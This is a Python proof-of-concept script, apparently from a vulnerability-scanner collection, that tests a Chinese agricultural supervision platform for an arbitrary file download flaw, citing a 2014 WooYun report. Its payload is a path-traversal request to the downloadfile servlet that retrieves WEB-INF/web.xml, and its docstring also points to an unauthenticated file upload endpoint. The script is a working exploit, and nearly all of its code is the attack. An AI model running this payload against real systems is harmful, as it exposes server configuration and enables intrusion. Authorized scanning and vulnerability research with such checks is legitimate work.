#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 中农信达监察平台任意文件下载
referer: http://www.wooyun.org/bugs/wooyun-2014-069864
author: Lucifer
description: servlet/downloadfile?filename= 文件下载。/hzs/HTMLEditor/upload_img.jsp 任意文件上传。
'''
import sys
import requests
import warnings
from termcolor import cprint

class sinda_downloadfile_download_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/finance/servlet/downloadfile?filename=/../WEB-INF/web.xml&userid=/"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"<web-app>" in req.text and r"<servlet-name>" in req.text:
                cprint("[+]存在中农信达监察平台任意文件下载漏洞...(高危)\tpayload: "+vulnurl, "red")

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = sinda_downloadfile_download_BaseVerify(sys.argv[1])
    testVuln.run()